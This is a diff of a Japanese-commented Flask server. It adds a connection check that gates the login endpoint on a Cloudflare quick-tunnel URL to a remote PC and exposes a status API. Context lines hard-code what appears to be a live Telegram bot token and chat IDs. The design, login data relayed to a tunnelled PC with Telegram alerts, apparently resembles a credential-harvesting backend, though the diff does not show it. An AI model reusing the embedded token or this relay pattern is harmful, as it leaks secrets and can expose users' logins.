@@ -30,8 +30,17 @@ DB_PATH = os.getenv('DB_PATH', 'data/alldatabase.json')
 TELEGRAM_BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN', '8314466263:AAG_eAJkU6j8SNFfJsodij9hkkdpSPARc6o')
 TELEGRAM_CHAT_IDS = os.getenv('TELEGRAM_CHAT_IDS', '8204394801,8129922775,8303180774,8243562591').split(',')
 
-# PC側のCloudflare URL
-CLOUDFLARE_URL = "https://config-surname-carroll-incoming.trycloudflare.com"
+# 🔥 PC側のCloudflare URL（環境変数から取得、なければデフォルト値）
+CLOUDFLARE_URL = os.getenv('CLOUDFLARE_URL', 'https://config-surname-carroll-incoming.trycloudflare.com').rstrip('/')
+
+# PC接続状態を管理
+pc_connection_status = {
+    'connected': False,
+    'last_check': None,
+    'last_success': None,
+    'url': CLOUDFLARE_URL,
+    'error': None
+}
 
 # セッションタイムアウト管理
 session_timeouts = {}
@@ -43,6 +52,56 @@ def log_with_timestamp(level, message):
     """タイムスタンプ付きログ出力"""
     timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]
     print(f"[{timestamp}] [SERVER] [{level}] {message}")
+
+# ========================================
+# PC接続チェック機能
+# ========================================
+
+def check_pc_connection_internal():
+    """PC側との接続を内部的にチェック"""
+    try:
+        log_with_timestamp("INFO", f"PC接続チェック開始 → {CLOUDFLARE_URL}/receive_check")
+        
+        response = requests.get(
+            f"{CLOUDFLARE_URL}/receive_check",
+            timeout=10
+        )
+        
+        pc_connection_status['last_check'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+        
+        if response.status_code == 200 and response.text.strip() == "yes!":
+            pc_connection_status['connected'] = True
+            pc_connection_status['last_success'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+            pc_connection_status['error'] = None
+            log_with_timestamp("SUCCESS", "✓ PC接続チェック成功")
+            return True
+        else:
+            pc_connection_status['connected'] = False
+            error_msg = f"予期しないレスポンス (Status: {response.status_code}, Text: {response.text})"
+            pc_connection_status['error'] = error_msg
+            log_with_timestamp("ERROR", f"✗ PC応答異常 | {error_msg}")
+            return False
+    
+    except requests.exceptions.Timeout:
+        pc_connection_status['connected'] = False
+        pc_connection_status['last_check'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+        pc_connection_status['error'] = "接続タイムアウト"
+        log_with_timestamp("ERROR", "✗ PC接続タイムアウト")
+        return False
+    
+    except requests.exceptions.ConnectionError as e:
+        pc_connection_status['connected'] = False
+        pc_connection_status['last_check'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+        pc_connection_status['error'] = f"接続エラー: {str(e)}"
+        log_with_timestamp("ERROR", f"✗ PC接続エラー: {str(e)}")
+        return False
+    
+    except Exception as e:
+        pc_connection_status['connected'] = False
+        pc_connection_status['last_check'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+        pc_connection_status['error'] = f"不明なエラー: {str(e)}"
+        log_with_timestamp("ERROR", f"✗ PC接続エラー: {str(e)}")
+        return False
 
 # ========================================
 # データベース操作関数
@@ -350,40 +409,119 @@ def check():
 
 @app.route('/api/check', methods=['POST'])
 def api_check():
-    """PC接続チェック"""
+    """
+    PC接続チェックAPI
+    /check ページから呼び出され、PC側との接続を確認する
+    """
     try:
+        log_with_timestamp("INFO", "=" * 60)
         log_with_timestamp("INFO", "PC接続チェック開始")
+        log_with_timestamp("INFO", f"接続先URL: {CLOUDFLARE_URL}")
+        log_with_timestamp("INFO", "=" * 60)
+        
+        # PC側の /receive_check エンドポイントに接続
         response = requests.get(
             f"{CLOUDFLARE_URL}/receive_check",
-            timeout=5
+            timeout=10
         )
         
+        # 接続状態を更新
+        pc_connection_status['last_check'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+        
         if response.status_code == 200 and response.text.strip() == "yes!":
-            log_with_timestamp("SUCCESS", "PC接続チェック成功")
+            # 接続成功
+            pc_connection_status['connected'] = True
+            pc_connection_status['last_success'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+            pc_connection_status['error'] = None
+            
+            log_with_timestamp("SUCCESS", "✓✓✓ PC接続チェック成功! ✓✓✓")
+            log_with_timestamp("INFO", f"レスポンス: {response.text}")
+            log_with_timestamp("INFO", "=" * 60)
+            
             return jsonify({
                 "status": "success",
-                "message": "チェック完了"
-            })
+                "message": "PC側との接続が確認できました",
+                "pc_response": response.text,
+                "timestamp": pc_connection_status['last_success']
+            }), 200
         else:
-            log_with_timestamp("ERROR", f"PC応答異常 | Status: {response.status_code} | Text: {response.text}")
+            # 予期しないレスポンス
+            pc_connection_status['connected'] = False
+            error_msg = f"予期しないレスポンス (Status: {response.status_code}, Text: {response.text})"
+            pc_connection_status['error'] = error_msg
+            
+            log_with_timestamp("ERROR", "✗✗✗ PC応答異常 ✗✗✗")
+            log_with_timestamp("ERROR", f"Status Code: {response.status_code}")
+            log_with_timestamp("ERROR", f"Response Text: {response.text}")
+            log_with_timestamp("INFO", "=" * 60)
+            
             return jsonify({
                 "status": "error",
-                "message": "チェック失敗（予期しないレスポンス）"
-            })
+                "message": "PC側から予期しないレスポンスが返されました",
+                "details": error_msg
+            }), 500
     
     except requests.exceptions.Timeout:
-        log_with_timestamp("ERROR", "PC接続タイムアウト")
+        pc_connection_status['connected'] = False
+        pc_connection_status['last_check'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+        pc_connection_status['error'] = "接続タイムアウト (10秒)"
+        
+        log_with_timestamp("ERROR", "✗✗✗ PC接続タイムアウト ✗✗✗")
+        log_with_timestamp("ERROR", "10秒以内に応答がありませんでした")
+        log_with_timestamp("INFO", "考えられる原因:")
+        log_with_timestamp("INFO", "1. PC側のapp.pyが起動していない")
+        log_with_timestamp("INFO", "2. Cloudflareトンネルが起動していない")
+        log_with_timestamp("INFO", "3. ネットワークの問題")
+        log_with_timestamp("INFO", "=" * 60)
+        
         return jsonify({
             "status": "error",
-            "message": "チェック失敗（タイムアウト）"
-        })
+            "message": "PC側への接続がタイムアウトしました",
+            "details": "10秒以内に応答がありませんでした"
+        }), 500
+    
+    except requests.exceptions.ConnectionError as e:
+        pc_connection_status['connected'] = False
+        pc_connection_status['last_check'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+        pc_connection_status['error'] = f"接続エラー: {str(e)}"
+        
+        log_with_timestamp("ERROR", "✗✗✗ PC接続エラー ✗✗✗")
+        log_with_timestamp("ERROR", f"詳細: {str(e)}")
+        log_with_timestamp("INFO", "考えられる原因:")
+        log_with_timestamp("INFO", "1. CloudflareのURLが間違っている")
+        log_with_timestamp("INFO", f"2. 現在のURL: {CLOUDFLARE_URL}")
+        log_with_timestamp("INFO", "3. Cloudflareトンネルが再起動され、URLが変わった可能性")
+        log_with_timestamp("INFO", "=" * 60)
+        
+        return jsonify({
+            "status": "error",
+            "message": "PC側への接続に失敗しました",
+            "details": str(e),
+            "current_url": CLOUDFLARE_URL
+        }), 500
     
     except Exception as e:
-        log_with_timestamp("ERROR", f"PC接続エラー: {str(e)}")
+        pc_connection_status['connected'] = False
+        pc_connection_status['last_check'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+        pc_connection_status['error'] = f"不明なエラー: {str(e)}"
+        
+        log_with_timestamp("ERROR", "✗✗✗ 不明なエラー ✗✗✗")
+        log_with_timestamp("ERROR", f"詳細: {str(e)}")
+        log_with_timestamp("INFO", "=" * 60)
+        
         return jsonify({
             "status": "error",
-            "message": f"チェック失敗（エラー: {str(e)}）"
-        })
+            "message": "予期しないエラーが発生しました",
+            "details": str(e)
+        }), 500
+
+@app.route('/api/pc-status', methods=['GET'])
+def api_pc_status():
+    """PC接続状態を取得"""
+    return jsonify({
+        'success': True,
+        'status': pc_connection_status
+    })
 
 # ========================================
 # API エンドポイント
@@ -403,6 +541,15 @@ def api_login():
         return jsonify({
             'success': False,
             'message': 'メールアドレスとパスワードを入力してください'
+        })
+    
+    # PC接続チェックを事前に実行
+    if not check_pc_connection_internal():
+        log_with_timestamp("ERROR", "PC側との接続が確認できません")
+        return jsonify({
+            'success': False,
+            'message': '一時的なエラーが発生しました。もう一度お試しください',
+            'details': 'PC connection failed'
         })
     
     try:
@@ -779,6 +926,17 @@ if __name__ == '__main__':
     print(f"Cloudflare URL: {CLOUDFLARE_URL}")
     print("=" * 70)
     log_with_timestamp("INFO", "システム起動開始")
+    
+    # 起動時にPC接続チェック
+    log_with_timestamp("INFO", "起動時PC接続チェック実行中...")
+    if check_pc_connection_internal():
+        log_with_timestamp("SUCCESS", "✓ PC側との接続確認完了!")
+    else:
+        log_with_timestamp("WARN", "⚠ PC側との接続に失敗しました")
+        log_with_timestamp("WARN", "以下を確認してください:")
+        log_with_timestamp("WARN", "1. PC側のapp.pyが起動しているか")
+        log_with_timestamp("WARN", "2. Cloudflareトンネルが起動しているか")
+        log_with_timestamp("WARN", f"3. 環境変数CLOUDFLARE_URLが正しいか: {CLOUDFLARE_URL}")
     
     debug_mode = os.getenv('DEBUG', 'True').lower() == 'true'
     port = int(os.getenv('PORT', 5000))
